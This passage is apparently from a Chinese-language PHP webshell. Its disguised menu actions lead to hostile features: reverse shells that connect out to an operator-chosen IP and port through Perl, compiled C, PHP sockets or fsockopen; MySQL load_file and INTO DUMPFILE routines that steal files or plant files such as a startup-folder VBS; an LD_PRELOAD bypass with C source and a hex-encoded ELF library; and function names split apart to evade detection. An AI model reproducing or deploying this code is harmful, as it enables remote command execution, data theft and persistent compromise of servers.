20px;font-size:18px;color:#333;height:120px;display:table-cell;vertical-align:middle;text-align:center;}</style>
<div class="layer-tip-box"><div class="title"><span>友情提示</span><div class="tool"><span>－</span><span>ロ</span><span>×</span></div></div><div class="content">$content</div></div>
EOF;
		self::htmlOut($result);
		die("<meta http-equiv=\"refresh\" content=\"1;URL=$url\">");
	}

}

class Login {

	public function checkLogin ($password) {
		$secret = 'gyWpLHKN'; // 密码 YZVlYfiI
		if (md5($secret . md5($password)) === '3447bf955576f6fe9ce5e044ef2d6f0b') {
			self::cookieHandle('set');
			die('<meta http-equiv="refresh" content="0;URL=">');
		}
	}

	public function cookieHandle ($flag) {
		if ($flag == 'set') {
			setcookie('PHPSESSIDS' , md5('*.gov.cn'));
		} else if ($flag == 'del') {
			setcookie('PHPSESSIDS' , null , time() - 3600);
		}
	}

	public function checkCookie () {
		if ($_COOKIE['PHPSESSIDS'] == md5('*.gov.cn')) {
			return true;
		} else {
			return false;
		}
	}

	public function logout () {
		self::cookieHandle('del');
		HtmlOutput::tips("您已注销，再见！" , "?");
	}
}

class Main {

	private static $loginClass;

	private static $htmlClass;

	public static  $fileClass;

	private static $action;

	private static $num;

	private static $socketClass;

	public function __construct () {
		self::$htmlClass   = new HtmlOutput();
		self::$loginClass  = new Login();
		self::$fileClass   = new FileHandler();
		self::$socketClass = new NeoReg();
		self::$action      = isset($GLOBALS['_GET']['action']) ? $GLOBALS['_GET']['action'] : "";
		self::$num         = 0;
	}

	public function mainHandler () {

		switch (self::$action) {
			case 'xxgk':
				self::$htmlClass->htmlMain(Foundation::getPhpInfo());
				break;
			case 'zcjd':
				self::$htmlClass->htmlMain(Foundation::getSysInfo());
				break;
			case 'wjdc':
				self::$htmlClass->htmlMain(self::$htmlClass->htmlBase64Js() . self::$fileClass->fileManage());
				break;
			case 'wjbj':
				self::$htmlClass->htmlMain(self::$htmlClass->htmlBase64Js() .self::$fileClass->fileEdit());
				break;
			case 'shbz':
				self::$htmlClass->htmlMain(self::$htmlClass->htmlBase64Js() . Foundation::magicMaster());
				break;
			case 'zxft':
				self::$htmlClass->htmlMain(self::$htmlClass->htmlBase64Js() . Foundation::chatRobot());
				break;
			case 'sjcx':
				self::$htmlClass->htmlMain(self::$htmlClass->htmlBase64Js() . self::moneyManage());
				break;
			case 'flyj':
				self::$htmlClass->htmlMain(self::$htmlClass->htmlBase64Js() . self::rebound());
				break;
			case 'bszn':
				self::$htmlClass->htmlMain(self::$htmlClass->htmlBase64Js() . self::preload());
				break;
			case 'yjzj':
				self::$htmlClass->htmlMain(self::$htmlClass->htmlBase64Js() . self::$fileClass->webShellScan());
				break;
			case 'bsjs':
				self::$htmlClass->htmlMain(self::$htmlClass->htmlBase64Js() . Foundation::portEye());
				break;
			case 'sxxc':
				self::$htmlClass->htmlMain(self::$socketClass->html());
				break;
			case 'bsxz':
				self::$htmlClass->htmlMain(self::$htmlClass->htmlBase64Js() . self::$fileClass->remoteDown());
				break;
			case 'zxsb':
				self::$htmlClass->htmlMain(Foundation::swordHtml());
				break;
			case 'down':
				self::$fileClass->downloadFile();
				break;
			case 'logout':
				self::$loginClass->logout();
				break;
			case 'rename':
				self::$fileClass->renameFile();
				break;
			case 'delfile':
				self::$fileClass->deleteFile();
				break;
			case 'deldir':
				self::$fileClass->deleteDirFile();
				break;
			case 'perm':
				self::$htmlClass->htmlMain(self::$fileClass->changePerm());
				break;
			case 'copy':
				self::$fileClass->copyFile();
				break;
			case 'unzip':
				self::$htmlClass->htmlMain(self::$fileClass->startUnZip());
				break;
			case 'pack';
				self::$fileClass->pack();
				break;
			case 'socket';
				self::$socketClass->start();
				break;
			case 'cxk';
				Foundation::sword();
				break;
			default:
				self::$htmlClass->htmlDefault();
				break;
		}
	}

	public function mainLogin () {
		if (self::$loginClass->checkCookie()) {
			self::mainHandler();
		} else {
			self::$htmlClass->htmlLogin();
			global $username;
			$username = isset($GLOBALS['_POST']['username']) ? $GLOBALS['_POST']['username'] : "";
			self::$loginClass->checkLogin($GLOBALS['_POST']['password']);
		}
	}

	public function rebound () {

		$target_ip   = $GLOBALS['_POST']['bound_1'] ? Decrypt::run($GLOBALS['_POST']['bound_1']) : getenv('REMOTE_ADDR');
		$target_port = $GLOBALS['_POST']['bound_2'] ? Decrypt::run($GLOBALS['_POST']['bound_2']) : '13333';

		$system = strtoupper(substr(PHP_OS , 0 , 3));
		$result = <<<END
<style>#kform{padding-right:50px;width:490px;margin:0 auto;}#kform .actall{margin-bottom:20px;}#kform .actall input,#kform .actall select{margin-left:20px;}#kform .actall select{width:80px;}.begin{float:right;}</style>
<form method="POST" name="kform" id="kform">
<div class="actall">母舰地址 <input id='bound_1' type="text" name="bound_1" value="{$target_ip}" style="width:400px"></div>
<div class="actall">母舰序号 <input id='bound_2' type="text" name="bound_2" value="{$target_port}" style="width:400px"></div>
<div class="actall">呼叫工具 <select name="use" >
<option value="1">Perl</option>
<option value="2">C</option>
<option value="3">PHP</option>
<option value="4">NC</option>
</select><input onclick="submitUrl()" type="submit" value="开始" style="width:80px;" class="begin"></div>
</form>
<script>function submitUrl(){document.getElementById('bound_1').value=base64encode(document.getElementById('bound_1').value);document.getElementById('bound_2').value=base64encode(document.getElementById('bound_2').value);document.getElementById('kform').submit()}</script>
END;
		if ((!empty($GLOBALS['_POST']['bound_1'])) && (!empty($GLOBALS['_POST']['bound_2']))) {

			echo '<div class="actall">';
			if ($GLOBALS['_POST']['use'] == '1') {
				$pl_code   = StringHandler::getCode('pgone');
				$result    .= self::$fileClass->writeFile('/tmp/dyAeLWNJ' , 'wb' , Decrypt::run($pl_code)) ? '创建/tmp/dyAeLWNJ成功<br>' : '创建/tmp/dyAeLWNJ失败<br>';
				$perl_path = Foundation::DeMarcia('which perl');
				$perl_path = $perl_path ? chop($perl_path) : 'perl';
				@unlink('/tmp/dyAeLWNJ.c');
				Foundation::DeMarcia($perl_path . ' /tmp/dyAeLWNJ ' . $target_ip . ' ' . $target_port . ' &');
				$result .= '母舰呼叫完成，请检查通讯结果。';
			}
			if ($GLOBALS['_POST']['use'] == '2') {
				$c_code = StringHandler::getCode('gai');
				$result .= self::$fileClass->writeFile('/tmp/dyAeLWNJ.c' , 'wb' , Decrypt::run($c_code)) ? '创建/tmp/dyAeLWNJ.c成功<br>' : '创建/tmp/dyAeLWNJ.c失败<br>';
				Foundation::DeMarcia('gcc -o /tmp/dyAeLWNJ /tmp/dyAeLWNJ.c');
				@unlink('/tmp/dyAeLWNJ.c');
				$result .= Foundation::DeMarcia('/tmp/dyAeLWNJ ' . $target_ip . ' ' . $target_port . ' &') ? 'nc -vv -l ' . $target_port : '执行命令失败';
			}
			if ($GLOBALS['_POST']['use'] == '3') {
				if (!extension_loaded('sockets')) {
					if ($system == 'WIN') {
						@dl('php_sockets.dll') or self::$htmlClass->tips("缺少相关模块" , '/?action=flyj');
					} else {
						@dl('sockets.so') or self::$htmlClass->tips("缺少模块" , '/?action=flyj');
					}
				}
				if ($system == "WIN") {
					$env = ['path' => 'c:\\windows\\system32'];
				} else {
					$env = ['PATH' => '/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin'];
				}
				$desc  = [
					0 => ["pipe" , "r"] ,
					1 => ["pipe" , "w"] ,
					2 => ["pipe" , "w"] ,
				];
				$host  = gethostbyname($target_ip);
				$proto = getprotobyname("tcp");
				$a     = 'soc' . 'ket' . '_' . 'cre' . 'ate';
				if (($sock = $a(AF_INET , SOCK_STREAM , $proto)) < 0) {
					die("与主舰的通讯建立失败");
				}
				if (($ret = socket_connect($sock , $host , $target_port)) < 0) {
					die("通讯建立失败");
				} else {
					$cwd = str_replace('\\' , '/' , dirname(__FILE__));
					while ($cmd = socket_read($sock , 65535 , $proto)) {
						$process = proc_open($cmd , $desc , $pipes , $cwd , $env);
						if (is_resource($process)) {
							fwrite($pipes[0] , $cmd);
							fclose($pipes[0]);
							$msg = stream_get_contents($pipes[1]);
							socket_write($sock , $msg , strlen($msg));
							fclose($pipes[1]);
							$msg = stream_get_contents($pipes[2]);
							socket_write($sock , $msg , strlen($msg));
							proc_close($process);
						}
					}
				}
			}

			if ($GLOBALS['_POST']['use'] == '4') {
				$result .= '<div class="actall">';
				$fp     = fsockopen($target_ip , $target_port , $errno , $errstr);
				if (!$fp) {
					$result .= "无法打开socket连接";
				} else {
					$username  = get_current_user();
					$file_path = THEPATH;
					$host      = $_SERVER['SERVER_NAME'];
					while (!feof($fp)) {
						$b = 'fp' . 'uts';
						$b($fp , " [$username@$host:$file_path]# ");
						$result  = fgets($fp , 4096);
						$message = Foundation::DeMarcia($result);
						$b($fp , "  --> " . $message . "\n");
					}
					fclose($fp);
				}
				$result .= '</div>';
			}
		}
		return $result;
	}

	public function moneyManage () {
		$message      = '';
		$money_return = '';
		$flag         = isset($GLOBALS['_POST']['host']) && isset($GLOBALS['_POST']['user']);
		$target_host  = $flag ? Decrypt::run($GLOBALS['_POST']['host']) : 'localhost';
		$target_user  = $flag ? Decrypt::run($GLOBALS['_POST']['user']) : 'root';
		$target_pass  = $flag ? Decrypt::run($GLOBALS['_POST']['pass']) : '';
		$target_name  = $flag ? Decrypt::run($GLOBALS['_POST']['data']) : 'mysql';
		$target_port  = $flag ? Decrypt::run($GLOBALS['_POST']['port']) : '3306';
		$sql          = $flag ? Decrypt::run($GLOBALS['_POST']['content']) : 'select version();';
		$ap           = 'mys' . 'ql_co' . 'nnent';
		$ao           = 'mys' . 'ql_se' . 'lect_db';
		$ai           = 'my' . 'sq' . 'l_qu' . 'ery';
		$au           = 'my' . 'sq' . 'l_fe' . 'tch_ar' . 'ray';
		$ay           = 'm' . 'ys' . 'ql_er' . 'ror';

		if ($flag) {
			if ($conn = mysql_connect($target_host . ':' . $target_port , $target_user , $target_pass)) {
				@$ao($target_name);
			} else {
				self::$htmlClass->tips('连接MYSQL失败' , '?action=sjcx');
			}
		}
		$down_file = 'c:/windows/homework/kaydenkdross.avi';
		if (!empty($GLOBALS['_POST']['downfile'])) {
			$down_file = self::$fileClass->filePathFormat(urldecode(Decrypt::run(urldecode($GLOBALS['_POST']['downfile']))));
			$bin_path  = bin2hex($down_file);
			$query     = "select load_file(0x$bin_path)";
			if ($money_return = @$ai($query , $conn)) {
				$k         = 0;
				$down_code = '';
				while ($row = @$au($money_return)) {
					$down_code .= $row[$k];
					$k ++;
				}
				if ($down_code) {
					$file_down = basename($down_file);
					if (!$file_down) $file_down = 'envl.tmp';
					$array     = explode('.' , $file_down);
					$array_end = array_pop($array);
					header('Content-type: application/x-' . $array_end);
					header('Content-Disposition: attachment; filename=' . $file_down);
					header('Content-Length: ' . strlen($down_code));
					echo $down_code;
					exit;
				} else {
					self::$htmlClass->tips("文件查询失败，请检查 mysql secure-file-priv 配置" , "?action=sjcx&type=d");
				}
			} else self::$htmlClass->tips("文件下载失败" , "?action=sjcx&type=d");
		}

		$type   = isset($GLOBALS['_GET']['type']) ? $GLOBALS['_GET']['type'] : '';
		$result = <<<END
<script language="javascript">function nFull(i){Str = new Array(11);Str[0] = "select version();";Str[1] = "select *** FROM user into outfile 'D:/web/iis.txt'";Str[2] = "select '<?php echo 'hello world';?>' into outfile 'F:/web/123.php';";Str[3] = "GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;";nform.content.value = Str[i];return true;}</script>
<style>form{width:850px;padding-right:50px;margin:0 auto;}.actall{margin-bottom:20px;}.actall a{margin-right:20px;color:#FF6600;}.actall a:hover{text-decoration:underline;}.actall input[type=text]{margin-right:20px;}.actall input:last-child{margin:0;}input[type=password]:focus{box-shadow:0 0 8px rgba(51,51,51,.6);}.actall input[type=password],input[type=button]{box-sizing:border-box;height:40px;padding:6px 12px;font-size:17px;line-height:1.42857143;color:#555;background-color:#fff;background-image:none;border:1px solid #ccc;border-radius:4px;outline:none;vertical-align:middle;margin-right:20px;}textarea{width:100%;height:200px;}.file-path{margin-bottom:20px;}.file-path input[type=text]{margin-left:20px;}.choose-file{display:inline-block;border:1px solid #ccc;width:80px;height:40px;border-radius:4px;font-size:14px;text-align:center;line-height:40px;position:relative;margin-left:20px;}.choose-file input{position:absolute;top:0;left:0;opacity:0;}.upload input:last-child{margin-left:20px;}.tip{color:#0ab2aa;text-align:center;}.border{padding:20px;text-align:center;border:1px solid #ccc;}</style>
<form method="POST" name="nform" id="nform"><div class="actall"><a href="?action=sjcx">[执行语句]</a><a href="?action=sjcx&type=u">[上传文件]</a><a href="?action=sjcx&type=d">[下载文件]</a></div><div class="actall">地址 <input id="host" type="text" name="host" value="$target_host" style="width:110px">端口 <input id="port" type="text" name="port" value="$target_port" style="width:110px">用户 <input id="user" type="text" name="user" value="$target_user" style="width:110px">密码 <input id="pass" type="password" name="pass" value="$target_pass" style="width:122px">库名 <input id="data" type="text" name="data" value="$target_name" style="width:110px"></div><div class="actall">
END;
		if ($type == 'u') {
			$uppath = 'C:/Documents and Settings/All Users/「开始」菜单/程序/启动/exp.vbs';
			if (!empty($GLOBALS['_POST']['uppath'])) {
				$uppath     = Decrypt::run($GLOBALS['_POST']['uppath']);
				$rand_str_1 = Foundation::returnRand(4);
				$rand_str_2 = Foundation::returnRand(2);
				$query      = "Create TABLE $rand_str_2 ($rand_str_1 text NOT NULL);";
				if (@$ai($query , $conn)) {
					if ($tmpcode = self::$fileClass->readFile($_FILES['upfile']['tmp_name'])) {
						$file_code = bin2hex(self::$fileClass->readFile($tmpcode));
					} else {
						$tmp = self::$fileClass->filePathFormat(THEPATH) . '/upfile.tmp';
						if (self::$fileClass->moveFile($_FILES['upfile']['tmp_name'] , $tmp)) {
							$file_code = bin2hex(self::$fileClass->readFile($tmp));
							@unlink($tmp);
						}
					}
					$query = 'Insert INTO ' . $rand_str_2 . ' (' . $rand_str_1 . ') VALUES(CONVERT(0x' . $file_code . ',CHAR));';
					if (@$ai($query , $conn)) {
						$query   = 'SELECT ' . $rand_str_1 . ' FROM ' . $rand_str_2 . ' INTO DUMPFILE \'' . $uppath . '\';';
						$message = @$ai($query , $conn) ? '上传文件成功' : '上传文件失败';
					} else {
						$message = '插入临时表失败';
					}
					@$ai('Drop TABLE IF EXISTS ' . $rand_str_2 . ';' , $conn);
				} else $message = '创建临时表失败';
			}
			$result .= <<<END
<div class="file-path">上传路径 <input id="uppath" type="text" name="uppath" value="$uppath" style="width:650px"></div><div><span>选择文件</span><div class="choose-file">选择文件<input type="file" name="upfile" class="choose-file"></div></div></div><div class="actall"><input onclick="SubmitUrl()" type="submit" value="上传" style="width:80px;">
<script>function SubmitUrl(){document.getElementById('host').value = base64encode(document.getElementById('host').value);document.getElementById('port').value = base64encode(document.getElementById('port').value);document.getElementById('user').value = base64encode(document.getElementById('user').value);document.getElementById('pass').value = base64encode(document.getElementById('pass').value);document.getElementById('data').value = base64encode(document.getElementById('data').value);document.getElementById('uppath').value = base64encode(encodeURI(document.getElementById('uppath').value));document.getElementById('nform').submit();}</script>
END;
		} else if ($type == 'd') {
			$result .= <<<END
<div class="upload">下载文件 <input id="downfile" type="text" name="downfile" value="$down_file" style="width:650px"></div></div><div class="actall"><a href="?action=sjcx&type=d"><input onclick="SubmitUrl()" type="submit" value="下载" style="width:80px;"></a>
<script>function SubmitUrl(){document.getElementById('host').value = base64encode(document.getElementById('host').value);document.getElementById('port').value = base64encode(document.getElementById('port').value);document.getElementById('user').value = base64encode(document.getElementById('user').value);document.getElementById('pass').value = base64encode(document.getElementById('pass').value);document.getElementById('data').value = base64encode(document.getElementById('data').value);document.getElementById('downfile').value = base64encode(encodeURI(document.getElementById('downfile').value));document.getElementById('nform').submit();}</script>
END;
		} else {
			if (!empty($GLOBALS['_POST']['content'])) {
				$msql = Decrypt::run($GLOBALS['_POST']['content']);
				if ($sql_result = @$ai($msql , $conn)) {
					$message = '动作执行成功<br>';
					$k       = 0;
					while ($row = @$au($sql_result)) {
						$money_return = $row[$k];
						$k ++;
					}
				} else $message .= $ay();
			}
			$result .= <<<END
<textarea name="content" id="content">$sql</textarea></div><div class="actall"><select onchange="return nFull(options[selectedIndex].value)"><option value="0" selected>显示版本</option><option value="1">导出文件</option><option value="2">写入文件</option><option value="3">开启外连</option></select><input type="button" value="执行" onclick="SubmitUrl();" style="width:80px;">
<script>function SubmitUrl(){document.getElementById('host').value = base64encode(document.getElementById('host').value);document.getElementById('port').value = base64encode(document.getElementById('port').value);document.getElementById('user').value = base64encode(document.getElementById('user').value);document.getElementById('pass').value = base64encode(document.getElementById('pass').value);document.getElementById('data').value = base64encode(document.getElementById('data').value);document.getElementById('content').value = base64encode(document.getElementById('content').value);document.getElementById('nform').submit();}</script>
END;
		}
		if ($message != '') $result .= "</div><div class=\"actall tip\">$message </div><div class='actall border'>$money_return</div></form>";
		return $result;
	}

	public function preload () {
		$type    = isset($GLOBALS['_POST']['type']) ? $GLOBALS['_POST']['type'] : '';
		$cpu     = isset($GLOBALS['_POST']['cpu']) ? $GLOBALS['_POST']['cpu'] : '';
		$content = isset($GLOBALS['_POST']["content"]) ? Decrypt::run($GLOBALS['_POST']["content"]) : '';
		$so_path = THEPATH . '/libsrc.so';
		$result  = <<<EOF
<style>.main-content{width:700px;padding-right:50px;margin:0 auto;}.tip{font-size:14px;line-height:26px;background-color:#f8f8f8;padding:10px 20px;color:#666;margin-bottom:20px;border-radius:4px;border:1px solid #ccc;}input[type=submit]{float:right;}select{margin-left:0;margin-right:20px;}.title{vertical-align:top;}textarea{margin-left:30px;width:573px;height:350px;font-size:14px;line-height:20px;}.result{margin-top:20px;}.result span{display:block;margin-bottom:10px;}</style>
<div class="main-content"><div class="tip">本模块仅实现centos版64位so文件自动生成，其他请自行补充，将自己编译的so文件命名为libsrc.so放至同目录下可直接调用，C程序源码如下，其他需求请自行修改。</div><form id="pform" method="post" action="?action=bszn">
EOF;
		$result  .= HtmlOutput::htmlSelect(['1' => '使用mail函数' , '2' => '使用imap_mail函数' , '3' => '使用error_log函数' , '4' => "使用md_send_mail函数"] , '' , '' , $name = 'type');
		$result  .= HtmlOutput::htmlSelect(['1' => '32位' , '2' => '64位'] , '' , '' , $name = 'cpu');
		$result  .= <<<EOF
执行命令：<input id="command"  name="content" type="text" value="ifconfig"><input onclick="submitUrl()" type="submit" value="执行"></form>
EOF;

		if (!$type && !$cpu && !$content) {
			$result .= <<<EOF
<span class="title">C程序源代码</span>
<textarea readonly>
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
extern char** environ;
__attribute__ ((__constructor__)) void preload (void)
{
    const char* cmdline = getenv("CDL");
    int i;
    for (i = 0; environ[i]; ++i) {
            if (strstr(environ[i], "LD_PRELOAD")) {
                    environ[i][0] = '\\0';
            }
    }
    system(cmdline);
}</textarea>
EOF;
		}

		$result .= <<<EOF
</div><script>function submitUrl(){document.getElementById('command').value=base64encode(document.getElementById('command').value);document.getElementById('pform').submit()}</script>
EOF;
		if ($type && $cpu) {
			if (!@file_exists($so_path)) {
				if ($cpu == '1') {
					$file_code = "";
				} else if ($cpu == '2') {
					$file_code = '7f454c4602010100000000000000000003003e00010000006006000000000000400000000000000028190000000000000000000040003800070040001d001a0001000000050000000000000000000000000000000000000000000000000000009c080000000000009c0800000000000000002000000000000100000006000000f00d000000000000f00d200000000000f00d2000000000004802000000000000500200000000000000002000000000000200000006000000100e000000000000100e200000000000100e200000000000c001000000000000c00100000000000008000000000000000400000004000000c801000000000000c801000000000000c80100000000000024000000000000002400000000000000040000000000000050e57464040000001808000000000000180800000000000018080000000000001c000000000000001c00000000000000040000000000000051e574640600000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000052e5746404000000f00d000000000000f00d200000000000f00d200000000000100200000000000010020000000000000100000000000000040000001400000003000000474e55006e4144111b7daecc96b5c89fdbb962bb05e5b1b000000000030000000d000000010000000600000088422001001000080d0000000f000000100000004245d5ecbbe3927cd971581c6d1287c2000000000000000000000000000000000000000000000000000000000000000003000900f80500000000000000000000000000007100000012000000000000000000000000000000000000001000000020000000000000000000000000000000000000007f00000012000000000000000000000000000000000000009100000021000000000000000000000000000000000000000100000020000000000000000000000000000000000000009200000011000000000000000000000000000000000000005500000020000000000000000000000000000000000000009000000011000000000000000000000000000000000000002c00000020000000000000000000000000000000000000004600000022000000000000000000000000000000000000007800000012000000000000000000000000000000000000009a0000001000170038102000000000000000000000000000ad0000001000180040102000000000000000000000000000a100000010001800381020000000000000000000000000006900000012000c0060070000000000009e00000000000000005f5f676d6f6e5f73746172745f5f005f49544d5f64657265676973746572544d436c6f6e655461626c65005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573007072656c6f616400676574656e76007374727374720073797374656d006c6962632e736f2e36005f5f656e7669726f6e005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000002000000020002000000020000000200000002000200010001000100010001000100860000001000000000000000751a690900000200b200000000000000f00d20000000000008000000000000003007000000000000000e2000000000000800000000000000f006000000000000301020000000000008000000000000003010200000000000f80d20000000000001000000100000000000000000000000d00f20000000000006000000030000000000000000000000d80f20000000000006000000060000000000000000000000e00f20000000000006000000070000000000000000000000e80f20000000000006000000080000000000000000000000f00f200000000000060000000a0000000000000000000000f80f200000000000060000000b00000000000000000000001810200000000000070000000200000000000000000000002010200000000000070000000400000000000000000000002810200000000000070000000c00000000000000000000004883ec08488b05d50920004885c07402ffd04883c408c300ff35f2092000ff25f40920000f1f4000ff25f20920006800000000e9e0ffffffff25ea0920006801000000e9d0ffffffff25e20920006802000000e9c0ffffffff25a209200066900000000000000000488d3dd1092000488d05d1092000554829f84889e54883f80e7615488b054e0920004885c074095dffe0660f1f4400005dc30f1f4000662e0f1f840000000000488d3d91092000488d358a092000554829fe4889e548c1fe034889f048c1e83f4801c648d1fe7418488b05210920004885c0740c5dffe0660f1f8400000000005dc30f1f4000662e0f1f840000000000803d4109200000752748833df708200000554889e5740c488b3d22092000e83dffffffe848ffffff5dc6051809200001f3c30f1f4000662e0f1f840000000000488d3dd106200048833f00750be95effffff660f1f440000488b05990820004885c074e9554889e5ffd05de940ffffff554889e54883ec10488d3d9a000000e8acfeffff488945f8c745f400000000eb4f488b0558082000488b008b55f44863d248c1e2034801d0488b00488d356b0000004889c7e896feffff4885c0741d488b052a082000488b008b55f44863d248c1e2034801d0488b00c600008345f401488b0509082000488b008b55f44863d248c1e2034801d0488b004885c07592488b45f84889c7e835feffff90c9c300004883ec084883c408c343444c004c445f5052454c4f414400011b033b1c00000002000000f8fdffff3800000048ffffff60000000000000001400000000000000017a5200017810011b0c070890010000240000001c000000b8fdffff40000000000e10460e184a0f0b770880003f1a3b2a332422000000001c00000044000000e0feffff9e00000000410e108602430d0602990c0708000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000030070000000000000000000000000000f0060000000000000000000000000000010000000000000086000000000000000c00000000000000f8050000000000000d0000000000000000080000000000001900000000000000f00d2000000000001b0000000000000010000000000000001a00000000000000000e2000000000001c000000000000000800000000000000f5feff6f00000000f0010000000000000500000000000000c003000000000000060000000000000028020000000000000a00000000000000be000000000000000b0000000000000018000000000000000300000000000000001020000000000002000000000000004800000000000000140000000000000007000000000000001700000000000000b0050000000000000700000000000000c0040000000000000800000000000000f00000000000000009000000000000001800000000000000feffff6f00000000a004000000000000ffffff6f000000000100000000000000f0ffff6f000000007e04000000000000f9ffff6f0000000003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100e2000000000000000000000000000000000000000000026060000000000003606000000000000460600000000000030102000000000004743433a20285562756e747520352e342e302d367562756e7475317e31362e30342e31302920352e342e30203230313630363039000000000000000000000000000000000000000000000000000000000000000003000100c80100000000000000000000000000000000000003000200f00100000000000000000000000000000000000003000300280200000000000000000000000000000000000003000400c003000000000000000000000000000000000000030005007e0400000000000000000000000000000000000003000600a00400000000000000000000000000000000000003000700c00400000000000000000000000000000000000003000800b00500000000000000000000000000000000000003000900f80500000000000000000000000000000000000003000a00100600000000000000000000000000000000000003000b00500600000000000000000000000000000000000003000c00600600000000000000000000000000000000000003000d00000800000000000000000000000000000000000003000e00090800000000000000000000000000000000000003000f00180800000000000000000000000000000000000003001000380800000000000000000000000000000000000003001100f00d20000000000000000000000000000000000003001200000e20000000000000000000000000000000000003001300080e20000000000000000000000000000000000003001400100e20000000000000000000000000000000000003001500d00f2000000000000000000000000000000000000300160000102000000000000000000000000000000000000300170030102000000000000000000000000000000000000300180038102000000000000000000000000000000000000300190000000000000000000000000000000000010000000400f1ff000000000000000000000000000000000c00000001001300080e20000000000000000000000000001900000002000c00600600000000000000000000000000001b00000002000c00a00600000000000000000000000000002e00000002000c00f00600000000000000000000000000004400000001001800381020000000000001000000000000005300000001001200000e20000000000000000000000000007a00000002000c00300700000000000000000000000000008600000001001100f00d2000000000000000000000000000a50000000400f1ff00000000000000000000000000000000010000000400f1ff00000000000000000000000000000000ab0000000100100098080000000000000000000000000000b900000001001300080e2000000000000000000000000000000000000400f1ff00000000000000000000000000000000c500000002000d0000080000000000000000000000000000cb0000000100170030102000000000000000000000000000d800000001001400100e2000000000000000000000000000e100000000000f0018080000000000000000000000000000f400000001001700381020000000000000000000000000000001000001001600001020000000000000000000000000001601000002000900f80500000000000000000000000000001c01000012000000000000000000000000000000000000003001000020000000000000000000000000000000000000004c0100001000170038102000000000000000000000000000530100001200000000000000000000000000000000000000670100002000000000000000000000000000000000000000a501000011000000000000000000000000000000000000007601000010001800401020000000000000000000000000007b01000010001800381020000000000000000000000000008701000012000c0060070000000000009e000000000000008f0100002000000000000000000000000000000000000000a30100001100000000000000000000000000000000000000ba0100002000000000000000000000000000000000000000d40100002200000000000000000000000000000000000000f001000012000000000000000000000000000000000000000063727473747566662e63005f5f4a43525f4c4953545f5f00646572656769737465725f746d5f636c6f6e6573005f5f646f5f676c6f62616c5f64746f72735f61757800636f6d706c657465642e37353934005f5f646f5f676c6f62616c5f64746f72735f6175785f66696e695f61727261795f656e747279006672616d655f64756d6d79005f5f6672616d655f64756d6d795f696e69745f61727261795f656e747279003132332e63005f5f4652414d455f454e445f5f005f5f4a43525f454e445f5f005f66696e69005f5f64736f5f68616e646c65005f44594e414d4943005f5f474e555f45485f4652414d455f484452005f5f544d435f454e445f5f005f474c4f42414c5f4f46465345545f5441424c455f005f696e697400676574656e764040474c4942435f322e322e35005f49544d5f64657265676973746572544d436c6f6e655461626c65005f65646174610073797374656d4040474c4942435f322e322e35005f5f676d6f6e5f73746172745f5f005f656e64005f5f6273735f7374617274007072656c6f6164005f4a765f5265676973746572436c6173736573005f5f656e7669726f6e4040474c4942435f322e322e35005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a654040474c4942435f322e322e35007374727374724040474c4942435f322e322e3500002e73796d746162002e737472746162002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e706c742e676f74002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e696e69745f6172726179002e66696e695f6172726179002e6a6372002e64796e616d6963002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001b000000070000000200000000000000c801000000000000c80100000000000024000000000000000000000000000000040000000000000000000000000000002e000000f6ffff6f0200000000000000f001000000000000f0010000000000003400000000000000030000000000000008000000000000000000000000000000380000000b000000020000000000000028020000000000002802000000000000980100000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000c003000000000000c003000000000000be0000000000000000000000000000000100000000000000000000000000000048000000ffffff6f02000000000000007e040000000000007e04000000000000220000000000000003000000000000000200000000000000020000000000000055000000feffff6f0200000000000000a004000000000000a004000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000c004